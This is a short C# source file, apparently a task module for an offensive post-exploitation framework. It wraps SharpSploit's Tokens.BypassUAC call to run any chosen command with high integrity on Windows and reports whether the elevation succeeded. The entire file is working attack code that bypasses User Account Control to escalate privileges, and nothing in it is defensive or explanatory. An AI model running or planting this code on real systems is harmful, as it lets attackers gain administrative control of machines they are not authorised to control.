using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class BypassUACCommand
    {
        public static string Execute(string Command, string Parameters = "", string Directory = "C:\\WINDOWS\\System32\\", string ProcessID = "0")
        {
            try
            {
                using (Tokens t = new Tokens())
                {
                    if (t.BypassUAC(Command, Parameters, Directory, Int32.Parse(ProcessID)))
                    {
                        return "Successfully executed: \"" + Directory + Command + " " + Parameters + "\" with high integrity.";
                    }
                    else
                    {
                        return "Failed to execute with high integrity.";
                    }
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}